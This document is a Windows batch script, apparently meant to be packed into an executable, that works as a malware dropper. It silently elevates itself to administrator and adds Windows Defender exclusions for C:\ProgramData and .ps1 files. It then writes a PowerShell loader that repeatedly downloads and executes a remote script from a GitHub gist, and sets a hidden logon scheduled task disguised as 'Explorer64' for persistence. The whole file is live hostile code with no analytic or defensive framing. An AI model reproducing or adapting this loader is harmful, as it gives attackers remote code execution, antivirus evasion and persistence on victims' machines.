::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFC0aY0qrck+GIroL5uT07u6Unk4IQOdyf53e37rDM+4S4UCpdpc/wnVVloYFABdNbQa5bxs9pmAPoGGGI8iO/h3kR0ef40k3VnVmgnXZiTx1adBn+g==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFC0aY0qrck+GIrAP4/z0/9a0rEwWUd0YeYLelLGWJYA=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal enabledelayedexpansion

for /f %%i in ('cmd /c echo %random%') do set "r=%%i"
if not "%1"=="!r:~-1!" (
    for /f "tokens=1,2,3,4" %%a in ('cmd /c "echo powershell&echo -WindowStyle&echo Hidden&echo -Command"') do (
        %%a %%b %%c %%d "Start-Process cmd -ArgumentList '/c \"%~f0\" !r:~-1!' -Verb RunAs -WindowStyle Hidden"
    )
    exit
)

set "t=Explorer64"
set "u=https://gist.githubusercontent.com/noreplyloginattemp-star/0d982a657db6d1dfd135be9bd6733701/raw/72bff5f5a201efadefb397c85537b2b495271731/061mV9Q2AKTnY97SW7UwzUM6GwTwSA.ps1"
set "l=C:\ProgramData\loader.ps1"

set "e1=Add-MpPreference"
set "e2=-ExclusionPath"
set "e3='C:\ProgramData'"
set "e4=-ExclusionExtension"
set "e5='.ps1'"

call :execps "%e1% %e2% %e3%"
call :execps "%e1% %e4% %e5%"

timeout /t 2 /nobreak >nul

(
echo while ^($true^) {
echo     try {
echo         iex^(New-Object Net.WebClient^).DownloadString^('%u%'^)
echo         break
echo     } catch {
echo         Start-Sleep -Seconds 30
echo     }
echo }
) > "%l%"

schtasks /create /tn "%t%" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%l%\"" /sc onlogon /rl highest /f

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%l%"

goto :eof

:execps
powershell -WindowStyle Hidden -Command "%~1"
goto :eof
